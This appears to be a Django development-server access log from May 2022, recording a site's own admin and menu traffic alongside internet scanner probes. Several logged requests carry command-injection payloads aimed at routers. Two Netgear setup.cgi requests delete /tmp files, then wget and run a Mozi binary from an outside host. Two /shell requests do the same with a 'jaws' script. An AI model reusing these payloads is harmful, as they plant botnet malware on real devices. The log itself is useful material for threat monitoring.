+[10/May/2022 07:31:46] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x03\x00\x94\x01\x00\x00\x90\x03\x03bz\x14âç±l\x02Å\x8b\x15|¸Nþôj\x87yý')
+[10/May/2022 07:31:46] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[10/May/2022 07:31:46] code 400, message Bad request version ("A\x00\x00*À,À+À0À/\x00\x9f\x00\x9eÀ$À#À(À'À")
+[10/May/2022 07:31:46] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /ab2g
+[10/May/2022 07:40:37] "GET /ab2g HTTP/1.1" 404 2218
+Not Found: /ab2h
+[10/May/2022 07:40:48] "GET /ab2h HTTP/1.1" 404 2218
+Not Found: /
+[10/May/2022 07:56:12] "GET / HTTP/1.0" 404 2188
+Not Found: /hudson
+[10/May/2022 08:09:46] "GET /hudson HTTP/1.1" 404 2213
+[10/May/2022 08:11:37] "POST /menu/ HTTP/1.1" 200 28
+[10/May/2022 08:11:48] "POST /menu/ HTTP/1.1" 200 185
+[10/May/2022 08:13:39] "POST /menu/ HTTP/1.1" 200 28
+Not Found: /
+[10/May/2022 08:44:31] "GET / HTTP/1.1" 404 2177
+Not Found: /.env
+[10/May/2022 09:35:35] "GET /.env HTTP/1.1" 404 2207
+Not Found: /
+[10/May/2022 09:35:35] "POST / HTTP/1.1" 404 2178
+Not Found: /portal/redlion
+[10/May/2022 09:54:49] "GET /portal/redlion HTTP/1.1" 404 2237
+Not Found: /actuator/health
+[10/May/2022 10:05:05] "GET /actuator/health HTTP/1.1" 404 2240
+Not Found: /
+[10/May/2022 10:36:46] "GET / HTTP/1.1" 404 2177
+[10/May/2022 10:51:35] "GET /admin/ HTTP/1.1" 302 0
+[10/May/2022 10:51:35] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2215
+Not Found: /
+[10/May/2022 10:54:10] "GET / HTTP/1.1" 404 2177
+Not Found: /HNAP1/
+[10/May/2022 11:18:01] "POST /menu/ HTTP/1.1" 200 301
+[10/May/2022 11:18:11] "POST /menu/ HTTP/1.1" 200 185
+[10/May/2022 11:18:46] "POST /menu/ HTTP/1.1" 200 189
+[10/May/2022 11:25:12] "POST /menu/ HTTP/1.1" 200 185
+[10/May/2022 11:25:24] "POST /menu/ HTTP/1.1" 200 185
+[10/May/2022 11:25:31] "POST /menu/ HTTP/1.1" 200 209
+[10/May/2022 11:25:37] "POST /menu/ HTTP/1.1" 200 189
+[10/May/2022 11:29:17] "POST /menu/ HTTP/1.1" 200 28
+[10/May/2022 11:29:37] "POST /menu/ HTTP/1.1" 200 209
+[10/May/2022 11:29:49] "POST /menu/ HTTP/1.1" 200 185
+[10/May/2022 11:30:00] "POST /menu/ HTTP/1.1" 200 189
+[10/May/2022 11:30:23] "POST /menu/ HTTP/1.1" 200 28
+[10/May/2022 11:30:28] "POST /menu/ HTTP/1.1" 200 267
+[10/May/2022 12:05:53] "POST /menu/ HTTP/1.1" 200 209
+[10/May/2022 12:06:01] "POST /menu/ HTTP/1.1" 200 185
+Not Found: /
+[10/May/2022 12:08:35] "GET / HTTP/1.1" 404 2180
+[10/May/2022 12:18:19] "POST /menu/ HTTP/1.1" 200 209
+[10/May/2022 12:18:27] "POST /menu/ HTTP/1.1" 200 185
+[10/May/2022 12:18:34] "POST /menu/ HTTP/1.1" 200 189
+[10/May/2022 12:18:42] "POST /menu/ HTTP/1.1" 200 305
+[10/May/2022 12:18:52] "POST /menu/ HTTP/1.1" 200 225
+[10/May/2022 12:19:01] "POST /menu/ HTTP/1.1" 200 203
+[10/May/2022 13:07:48] "POST /menu/ HTTP/1.1" 200 327
+[10/May/2022 13:08:18] "POST /menu/ HTTP/1.1" 200 28
+Not Found: /.env
+[10/May/2022 13:31:23] "GET /.env HTTP/1.1" 404 2207
+[10/May/2022 13:31:23] code 400, message Bad request version ('\x8am¡ëO\x9d\x14\\ã\x83\x80ø]\x07©$Ï©ãU\x04c\x13\x18\x00b\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00£\x00\x9f\x00¢\x00\x9eÌªÀ¯À\xadÀ$À(À')
+[10/May/2022 13:31:23] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[10/May/2022 13:59:18] "POST /menu/ HTTP/1.1" 200 209
+Not Found: /GponForm/diag_Form
+[10/May/2022 14:44:17] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 2257
+[10/May/2022 14:44:18,510] - Broken pipe from ('217.8.232.66', 25666)
+
+[10/May/2022 14:46:21] code 400, message Bad request version ('Ç3')
+[10/May/2022 14:46:21] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /
+[10/May/2022 14:46:26] "OPTIONS / HTTP/1.0" 404 2181
+Not Found: /setup.cgi
+[10/May/2022 15:06:18] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://125.45.83.12:44800/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 2397
+Not Found: /
+[10/May/2022 15:32:17] "GET / HTTP/1.1" 404 2177
+Not Found: /.env
+[10/May/2022 16:13:53] "GET /.env HTTP/1.1" 404 2207
+[10/May/2022 16:13:53] code 400, message Bad request version ("\x19*|$lf\x0fæzl\x13!Lñ`â\x011ñ\x80ÑöÇ!\x00V\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00\x9f\x00\x9eÌªÀ¯À\xadÀ®À¬À$À(À#À'À")
+[10/May/2022 16:13:53] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /
+[10/May/2022 16:14:10] "GET / HTTP/1.1" 404 2180
+Not Found: /
+[10/May/2022 17:09:14] "GET / HTTP/1.1" 404 2180
+[10/May/2022 17:09:14,679] - Broken pipe from ('43.131.91.178', 39396)
+
+Not Found: /
+[10/May/2022 17:09:18] "GET / HTTP/1.1" 404 2177
+Not Found: /favicon.ico
+[10/May/2022 17:09:19] "GET /favicon.ico HTTP/1.1" 404 2228
+Not Found: /
+[10/May/2022 17:35:46] "GET / HTTP/1.1" 404 2180
+Not Found: /
+[10/May/2022 17:46:10] "GET / HTTP/1.1" 404 2180
+Not Found: /
+[10/May/2022 17:59:03] "GET / HTTP/1.0" 404 2180
+Not Found: /
+[10/May/2022 18:25:54] "GET / HTTP/1.1" 404 2180
+Not Found: /.env
+[10/May/2022 18:34:38] "GET /.env HTTP/1.1" 404 2207
+Not Found: /
+[10/May/2022 18:34:38] "POST / HTTP/1.1" 404 2178
+Not Found: /config/getuser
+[10/May/2022 19:52:10] "GET /config/getuser?index=0 HTTP/1.1" 404 2248
+Not Found: /
+[10/May/2022 20:26:50] "GET / HTTP/1.1" 404 2180
+Not Found: /setup.cgi
+[10/May/2022 20:51:28] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 2395
+Not Found: /
+[10/May/2022 21:15:38] "GET / HTTP/1.1" 404 2180
+Not Found: /
+[10/May/2022 21:55:08] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[10/May/2022 22:34:07] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[10/May/2022 22:46:09] "GET / HTTP/1.0" 404 2188
+Not Found: /
+[10/May/2022 23:26:27] "GET / HTTP/1.1" 404 2180
+[10/May/2022 23:34:13] "POST /menu/ HTTP/1.1" 200 28
+[10/May/2022 23:41:48] code 400, message Bad request version ('À\x13À')
+[10/May/2022 23:41:48] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /spotfire/login.html
+[10/May/2022 23:41:49] "GET /spotfire/login.html HTTP/1.1" 404 2252
+[10/May/2022 23:53:52] "GET /admin/ HTTP/1.1" 200 6873
+[10/May/2022 23:53:52] "GET /static/admin/css/base.css HTTP/1.1" 200 19513
+[10/May/2022 23:53:52] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 200 2616
+[10/May/2022 23:53:52] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 200 3401
+[10/May/2022 23:53:52] "GET /static/admin/css/dashboard.css HTTP/1.1" 200 380
+[10/May/2022 23:53:52] "GET /static/admin/css/responsive.css HTTP/1.1" 200 18575
+[10/May/2022 23:53:52] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423
+[10/May/2022 23:53:52] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 200 86184
+[10/May/2022 23:53:52] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 85876
+[10/May/2022 23:53:52] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 85692
+[10/May/2022 23:53:52] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 200 331
+[10/May/2022 23:53:52] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 200 380
+Not Found: /favicon.ico
+[10/May/2022 23:53:53] "GET /favicon.ico HTTP/1.1" 404 2228
+[10/May/2022 23:53:56] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9505
+[10/May/2022 23:53:56] "GET /static/admin/css/forms.css HTTP/1.1" 200 8878
+[10/May/2022 23:53:56] "GET /static/admin/js/calendar.js HTTP/1.1" 200 8466
+[10/May/2022 23:53:56] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[10/May/2022 23:53:56] "GET /static/admin/js/jquery.init.js HTTP/1.1" 200 347
+[10/May/2022 23:53:56] "GET /static/admin/js/admin/DateTimeShortcuts.js HTTP/1.1" 200 19634
+[10/May/2022 23:53:56] "GET /static/admin/js/core.js HTTP/1.1" 200 5698
+[10/May/2022 23:53:56] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 200 5984
+[10/May/2022 23:53:56] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 200 288580
+[10/May/2022 23:53:56] "GET /static/admin/js/actions.js HTTP/1.1" 200 7872
+[10/May/2022 23:53:56] "GET /static/admin/css/widgets.css HTTP/1.1" 200 11097
+[10/May/2022 23:53:56] "GET /static/admin/js/urlify.js HTTP/1.1" 200 7902
+[10/May/2022 23:53:56] "GET /static/admin/js/prepopulate.js HTTP/1.1" 200 1531
+[10/May/2022 23:53:56] "GET /static/admin/js/prepopulate_init.js HTTP/1.1" 200 492
+[10/May/2022 23:53:56] "GET /static/admin/js/change_form.js HTTP/1.1" 200 606
+[10/May/2022 23:53:56] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 200 232381
+Not Found: /favicon.ico
+[10/May/2022 23:53:57] "GET /favicon.ico HTTP/1.1" 404 2228
+[10/May/2022 23:56:53] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[10/May/2022 23:56:53] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9740
+[10/May/2022 23:56:53] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[10/May/2022 23:57:58] "POST /admin/menu/menu/add/ HTTP/1.1" 302 0
+[10/May/2022 23:57:58] "GET /admin/menu/menu/add/ HTTP/1.1" 200 9740
+[10/May/2022 23:57:58] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[10/May/2022 23:58:35] "POST /admin/menu/menu/add/ HTTP/1.1" 200 9667
+[10/May/2022 23:58:35] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[10/May/2022 23:58:38] "GET /admin/menu/menu/ HTTP/1.1" 200 39507
+[10/May/2022 23:58:38] "GET /static/admin/css/changelists.css HTTP/1.1" 200 6932
+[10/May/2022 23:58:38] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[10/May/2022 23:58:38] "GET /static/admin/img/tooltag-add.svg HTTP/1.1" 200 331
+[10/May/2022 23:59:42] "GET /admin/logout/ HTTP/1.1" 200 1530
+[10/May/2022 23:59:44] "GET /admin/ HTTP/1.1" 302 0
+[10/May/2022 23:59:44] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2215
+[10/May/2022 23:59:45] "GET /static/admin/css/login.css HTTP/1.1" 200 954
+[11/May/2022 00:00:05,486] - Broken pipe from ('210.104.204.16', 56249)
+
+[11/May/2022 00:00:05,499] - Broken pipe from ('210.104.204.16', 56247)
+
+[11/May/2022 00:00:05,500] - Broken pipe from ('210.104.204.16', 56248)
+
+[11/May/2022 00:00:05,500] - Broken pipe from ('210.104.204.16', 56250)
+
+[11/May/2022 00:00:05,501] - Broken pipe from ('210.104.204.16', 56251)
+
+[11/May/2022 00:32:49] "GET /admin/ HTTP/1.1" 302 0
+[11/May/2022 00:32:49] "GET /admin/ HTTP/1.1" 302 0
+[11/May/2022 00:32:49] "GET /admin/ HTTP/1.1" 302 0
+[11/May/2022 00:32:49] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2215
+[11/May/2022 00:32:49] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2215
+[11/May/2022 00:32:49] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2215
+[11/May/2022 00:33:12] "GET /admin/ HTTP/1.1" 302 0
+[11/May/2022 00:33:12] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2215
+[11/May/2022 00:33:12] "GET /static/admin/css/base.css HTTP/1.1" 200 19513
+[11/May/2022 00:33:12] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 200 2616
+[11/May/2022 00:33:12] "GET /static/admin/css/login.css HTTP/1.1" 200 954
+[11/May/2022 00:33:12] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 200 3401
+[11/May/2022 00:33:12] "GET /static/admin/css/responsive.css HTTP/1.1" 200 18575
+[11/May/2022 00:33:12] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423
+[11/May/2022 00:33:13] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 85876
+[11/May/2022 00:33:13] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 85692
+[11/May/2022 00:33:41] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 200 86184
+[11/May/2022 00:33:48] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
+[11/May/2022 00:33:48] "GET /admin/ HTTP/1.1" 200 6873
+[11/May/2022 00:33:48] "GET /static/admin/css/dashboard.css HTTP/1.1" 200 380
+[11/May/2022 00:33:49] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 200 380
+[11/May/2022 00:33:49] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 200 331
+[11/May/2022 00:33:56] "GET /admin/menu/menu/ HTTP/1.1" 200 39507
+[11/May/2022 00:33:56] "GET /static/admin/css/changelists.css HTTP/1.1" 200 6932
+[11/May/2022 00:33:56] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[11/May/2022 00:33:56] "GET /static/admin/js/jquery.init.js HTTP/1.1" 200 347
+[11/May/2022 00:33:56] "GET /static/admin/js/core.js HTTP/1.1" 200 5698
+[11/May/2022 00:33:56] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 200 5984
+[11/May/2022 00:33:56] "GET /static/admin/js/actions.js HTTP/1.1" 200 7872
+[11/May/2022 00:33:56] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 200 288580
+[11/May/2022 00:33:56] "GET /static/admin/js/urlify.js HTTP/1.1" 200 7902
+[11/May/2022 00:33:56] "GET /static/admin/js/prepopulate.js HTTP/1.1" 200 1531
+[11/May/2022 00:33:56] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 200 232381
+[11/May/2022 00:33:56] "GET /static/admin/img/tooltag-add.svg HTTP/1.1" 200 331
+[11/May/2022 00:34:51] "GET /admin/menu/menu/69/change/ HTTP/1.1" 200 9927
+[11/May/2022 00:34:51] "GET /static/admin/js/admin/DateTimeShortcuts.js HTTP/1.1" 200 19634
+[11/May/2022 00:34:51] "GET /static/admin/css/forms.css HTTP/1.1" 200 8878
+[11/May/2022 00:34:51] "GET /static/admin/js/calendar.js HTTP/1.1" 200 8466
+[11/May/2022 00:34:51] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[11/May/2022 00:34:51] "GET /static/admin/js/prepopulate_init.js HTTP/1.1" 200 492
+[11/May/2022 00:34:52] "GET /static/admin/js/change_form.js HTTP/1.1" 200 606
+[11/May/2022 00:34:52] "GET /static/admin/css/widgets.css HTTP/1.1" 200 11097
+[11/May/2022 00:34:52] "GET /static/admin/img/icon-calendar.svg HTTP/1.1" 200 1086
+[11/May/2022 00:38:02] "GET /admin/ HTTP/1.1" 200 6873
+[11/May/2022 00:38:04] "GET /admin/menu/menu/ HTTP/1.1" 200 39507
+[11/May/2022 00:38:04] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[11/May/2022 00:39:12] "GET /admin/ HTTP/1.1" 200 6873
+[11/May/2022 00:39:14] "GET /admin/menu/menu/ HTTP/1.1" 200 39507
+[11/May/2022 00:39:14] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[11/May/2022 00:39:46] "GET /admin/menu/menu/17/change/ HTTP/1.1" 200 9904
+[11/May/2022 00:39:46] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[11/May/2022 00:40:10] "GET /admin/ HTTP/1.1" 200 6873
+[11/May/2022 00:40:11] "GET /admin/menu/menu/ HTTP/1.1" 200 39507
+[11/May/2022 00:40:11] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[11/May/2022 00:40:19] "GET /admin/menu/menu/18/change/ HTTP/1.1" 200 9877
+[11/May/2022 00:40:19] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[11/May/2022 00:40:21] "POST /menu/ HTTP/1.1" 200 267
+[11/May/2022 00:40:27] "POST /admin/menu/menu/18/change/ HTTP/1.1" 302 0
+[11/May/2022 00:40:27] "GET /admin/menu/menu/ HTTP/1.1" 200 39706
+[11/May/2022 00:40:28] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[11/May/2022 00:40:28] "GET /static/admin/img/icon-yes.svg HTTP/1.1" 200 436
+[11/May/2022 00:48:52] "POST /menu/ HTTP/1.1" 200 384
+[11/May/2022 00:51:48] "POST /menu/ HTTP/1.1" 200 28
+[11/May/2022 01:14:49] "POST /menu/ HTTP/1.1" 200 185
+[11/May/2022 01:15:03] "POST /menu/ HTTP/1.1" 200 305
+[11/May/2022 01:15:20] "POST /menu/ HTTP/1.1" 200 189
+[11/May/2022 01:15:32] "POST /menu/ HTTP/1.1" 200 267
+[11/May/2022 01:15:43] "POST /menu/ HTTP/1.1" 200 209
+[11/May/2022 01:15:58] "POST /menu/ HTTP/1.1" 200 203
+[11/May/2022 01:28:20] "POST /menu/ HTTP/1.1" 200 384
+Not Found: /.env
+[11/May/2022 01:49:12] "GET /.env HTTP/1.1" 404 2207
+Not Found: /.env
+[11/May/2022 01:54:44] "GET /.env HTTP/1.1" 404 2207
+[11/May/2022 02:00:10] "POST /menu/ HTTP/1.1" 200 384
+[11/May/2022 02:00:17] "POST /menu/ HTTP/1.1" 200 384
+[11/May/2022 02:15:06] "POST /menu/ HTTP/1.1" 200 267
+[11/May/2022 02:50:06,120] - Broken pipe from ('45.227.254.51', 24968)
+
+[11/May/2022 02:50:06] code 400, message Bad HTTP/0.9 request type ("\x03\x00\x00,'à\x00\x00\x00\x00\x00Cookie:")
+[11/May/2022 02:50:06] "  ,'à     Cookie: mstshash=Domain" 400 -
+[11/May/2022 02:50:07] code 400, message Bad HTTP/0.9 request type ("\x03\x00\x00,'à\x00\x00\x00\x00\x00Cookie:")
+[11/May/2022 02:50:07] "  ,'à     Cookie: mstshash=Domain" 400 -
+Not Found: /
+[11/May/2022 03:01:37] "GET / HTTP/1.1" 404 2180
+[11/May/2022 03:13:50] "POST /menu/ HTTP/1.1" 200 384
+[11/May/2022 03:14:08] "POST /menu/ HTTP/1.1" 200 267
+[11/May/2022 03:14:18] "POST /menu/ HTTP/1.1" 200 273
+Not Found: /
+[11/May/2022 03:14:35] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[11/May/2022 04:08:09] "GET / HTTP/1.1" 404 2188
+[11/May/2022 04:08:09,649] - Broken pipe from ('185.189.182.234', 59982)
+
+Not Found: /GponForm/diag_Form
+[11/May/2022 04:26:38] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 2257
+[11/May/2022 04:26:39,464] - Broken pipe from ('61.52.235.186', 35282)
+
+[11/May/2022 04:47:09] "POST /menu/ HTTP/1.1" 200 28
+[11/May/2022 04:47:16] "POST /menu/ HTTP/1.1" 200 28
+[11/May/2022 05:15:33] "POST /menu/ HTTP/1.1" 200 217
+[11/May/2022 05:16:34] "GET /admin/ HTTP/1.1" 302 0
+[11/May/2022 05:16:34] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2215
+[11/May/2022 05:16:34] "GET /admin/ HTTP/1.1" 200 6876
+[11/May/2022 05:16:36] "GET /admin/menu/menu/ HTTP/1.1" 200 39501
+[11/May/2022 05:16:36] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[11/May/2022 05:16:44] "GET /admin/menu/menu/59/change/ HTTP/1.1" 200 9895
+[11/May/2022 05:16:44] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[11/May/2022 05:16:53] "POST /admin/menu/menu/59/change/ HTTP/1.1" 302 0
+[11/May/2022 05:16:54] "GET /admin/menu/menu/ HTTP/1.1" 200 39695
+[11/May/2022 05:16:54] "GET /admin/jsi18n/ HTTP/1.1" 200 3343
+[11/May/2022 05:17:07] "POST /menu/ HTTP/1.1" 200 203
+[11/May/2022 05:17:23] "POST /menu/ HTTP/1.1" 200 195
+Not Found: /
+[11/May/2022 05:29:50] "GET / HTTP/1.1" 404 2177
+[11/May/2022 05:38:25] "POST /menu/ HTTP/1.1" 200 189
+[11/May/2022 05:39:01] "POST /menu/ HTTP/1.1" 200 28
+[11/May/2022 05:42:27] "POST /menu/ HTTP/1.1" 200 305
+[11/May/2022 05:42:41] "POST /menu/ HTTP/1.1" 200 225
+[11/May/2022 05:50:52] "POST /menu/ HTTP/1.1" 200 185
+[11/May/2022 05:51:18] "POST /menu/ HTTP/1.1" 200 189
+Not Found: /.env
+[11/May/2022 07:12:42] "GET /.env HTTP/1.1" 404 2207
+Not Found: /
+[11/May/2022 07:12:44] "POST / HTTP/1.1" 404 2178
+Not Found: /api.php
+[11/May/2022 07:31:54] "GET /api.php?key=1&apikey=1 HTTP/1.1" 404 2235
+[11/May/2022 07:52:39] "POST /menu/ HTTP/1.1" 200 28
+[11/May/2022 07:52:48] "POST /menu/ HTTP/1.1" 200 28
+Not Found: /
+[11/May/2022 08:42:37] "GET / HTTP/1.0" 404 2180
+[11/May/2022 09:01:15] code 400, message Bad request version ('À\x14À')
+[11/May/2022 09:01:15] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /
+[11/May/2022 09:01:30] "GET / HTTP/1.1" 404 2177
+Not Found: /favicon.ico
+[11/May/2022 09:01:52] "GET /favicon.ico HTTP/1.1" 404 2228
+Not Found: /robots.txt
+[11/May/2022 09:01:55] "GET /robots.txt HTTP/1.1" 404 2225
+Not Found: /sitemap.xml
+[11/May/2022 09:01:59] "GET /sitemap.xml HTTP/1.1" 404 2228
+[11/May/2022 09:02:12,748] - Broken pipe from ('134.122.134.161', 60358)
+
+Not Found: /
+[11/May/2022 09:11:59] "GET / HTTP/1.1" 404 2177
+[11/May/2022 09:52:11] "POST /menu/ HTTP/1.1" 200 305
+Not Found: /console/
+[11/May/2022 10:01:39] "GET /console/ HTTP/1.1" 404 2222
+Not Found: /
+[11/May/2022 10:08:54] "GET / HTTP/1.1" 404 2177
+[11/May/2022 10:48:00,618] - Broken pipe from ('20.239.173.152', 52838)
+
+Not Found: /robots.txt
+[11/May/2022 10:48:00] "HEAD /robots.txt HTTP/1.0" 404 2237
+Not Found: /
+[11/May/2022 11:05:47] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[11/May/2022 11:13:26] "GET / HTTP/1.1" 404 2177
+Not Found: /.env
+[11/May/2022 11:26:41] "GET /.env HTTP/1.1" 404 2207
+[11/May/2022 11:26:41] code 400, message Bad request version ('\x01\x06Ra\x00b\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00£\x00\x9f\x00¢\x00\x9eÌªÀ¯À\xadÀ$À(À')
+[11/May/2022 11:26:41] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[11/May/2022 11:30:05] "POST /menu/ HTTP/1.1" 200 305
+[11/May/2022 11:31:49] "POST /menu/ HTTP/1.1" 200 209
+[11/May/2022 11:31:56] "POST /menu/ HTTP/1.1" 200 225
+Not Found: /
+[11/May/2022 11:35:57] "GET / HTTP/1.0" 404 2188
+[11/May/2022 11:48:26] "POST /menu/ HTTP/1.1" 200 305
+[11/May/2022 11:51:10] "POST /menu/ HTTP/1.1" 200 209
+[11/May/2022 11:51:15] "POST /menu/ HTTP/1.1" 200 28
+[11/May/2022 11:51:20] "POST /menu/ HTTP/1.1" 200 189
+[11/May/2022 12:11:52] "POST /menu/ HTTP/1.1" 200 305
+Not Found: /
+[11/May/2022 12:18:28] "GET / HTTP/1.1" 404 2177
+Not Found: /bag2
+[11/May/2022 12:54:46] "GET /bag2 HTTP/1.1" 404 2207
+[11/May/2022 13:28:28] "GET /admin/ HTTP/1.1" 302 0
+Not Found: /index.php
+[11/May/2022 13:50:07] "GET /index.php HTTP/1.1" 404 2222
+Not Found: /phpmyadmin/index.php
+[11/May/2022 13:50:07] "GET /phpmyadmin/index.php HTTP/1.1" 404 2255
+Not Found: /
+[11/May/2022 14:23:40] "GET / HTTP/1.0" 404 2177
+[11/May/2022 14:23:40,414] - Broken pipe from ('121.135.231.7', 7513)
+
+Not Found: /
+[11/May/2022 14:49:42] "GET / HTTP/1.1" 404 2188
+[11/May/2022 14:49:42,867] - Broken pipe from ('191.5.84.131', 17499)
+
+Not Found: /
+[11/May/2022 14:53:18] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[11/May/2022 14:58:08] "POST / HTTP/1.1" 404 2178
+Not Found: /shell
+[11/May/2022 15:21:19] "GET /shell?cd+/tmp;rm+-rf+*;wget+jx.qingdaosheng.com/jaws;sh+/tmp/jaws HTTP/1.1" 404 2269
+[11/May/2022 15:21:20,300] - Broken pipe from ('156.221.219.50', 60178)
+
+Not Found: /shell
+[11/May/2022 16:36:54] "GET /shell?cd+/tmp;rm+-rf+*;wget+jx.qingdaosheng.com/jaws;sh+/tmp/jaws HTTP/1.1" 404 2269
+[11/May/2022 16:36:55,267] - Broken pipe from ('156.211.209.220', 52827)
+
+Not Found: /api.php
+[11/May/2022 17:16:47] "GET /api.php?key=1&apikey=1 HTTP/1.1" 404 2235
+Not Found: /
+[11/May/2022 17:23:22] "GET / HTTP/1.0" 404 2188
+Not Found: /
+[11/May/2022 19:51:04] "GET / HTTP/1.1" 404 2177
+Not Found: /.env
+[11/May/2022 20:35:51] "GET /.env HTTP/1.1" 404 2207
+Not Found: /
+[11/May/2022 20:35:53] "POST / HTTP/1.1" 404 2178
+Not Found: /
+[11/May/2022 20:50:47] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[11/May/2022 21:08:26] "GET / HTTP/1.1" 404 2180
+[11/May/2022 22:01:45] "POST /menu/ HTTP/1.1" 200 305
+[11/May/2022 22:02:20] "POST /menu/ HTTP/1.1" 200 305
+Not Found: /
+[11/May/2022 23:15:42] "GET / HTTP/1.1" 404 2177
+Not Found: /
+[11/May/2022 23:23:10] "HEAD / HTTP/1.0" 404 2189
+Not Found: /system_api.php
+[11/May/2022 23:23:11] "GET /system_api.php HTTP/1.1" 404 2237
+Not Found: /c/version.js
+[11/May/2022 23:23:11] "GET /c/version.js HTTP/1.1" 404 2231
+Not Found: /streaming/clients_live.php
+[11/May/2022 23:23:11] "GET /streaming/clients_live.php HTTP/1.1" 404 2273
+Not Found: /stalker_portal/c/version.js
+[11/May/2022 23:23:12] "GET /stalker_portal/c/version.js HTTP/1.1" 404 2276
+Not Found: /stream/live.php
+[11/May/2022 23:23:12] "GET /stream/live.php HTTP/1.1" 404 2240
+Not Found: /flu/403.html
+[11/May/2022 23:23:13] "GET /flu/403.html HTTP/1.1" 404 2231
+Not Found: /
+[11/May/2022 23:23:13] "GET / HTTP/1.1" 404 2177
+[11/May/2022 23:45:31] "GET /admin/ HTTP/1.1" 302 0
+[11/May/2022 23:45:31] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 2215
+[11/May/2022 23:45:31] "GET /static/admin/css/base.css HTTP/1.1" 304 0
+[11/May/2022 23:45:31] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 304 0
+[11/May/2022 23:45:31] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 304 0
+[11/May/2022 23:45:31] "GET /static/admin/css/login.css HTTP/1.1" 304 0
+[11/May/2022 23:45:31] "GET /static/admin/css/responsive.css HTTP/1.1" 304 0
+[11/May/2022 23:45:31] "GET /static/admin/css/fonts.css HTTP/1.1" 304 0
+[11/May/2022 23:45:32] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 304 0
+[11/May/2022 23:45:32] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 304 0
+[11/May/2022 23:45:32] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 304 0
+Not Found: /favicon.ico
+[11/May/2022 23:45:32] "GET /favicon.ico HTTP/1.1" 404 2228
+[11/May/2022 23:45:46] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
+[11/May/2022 23:45:46] "GET /admin/ HTTP/1.1" 200 6879
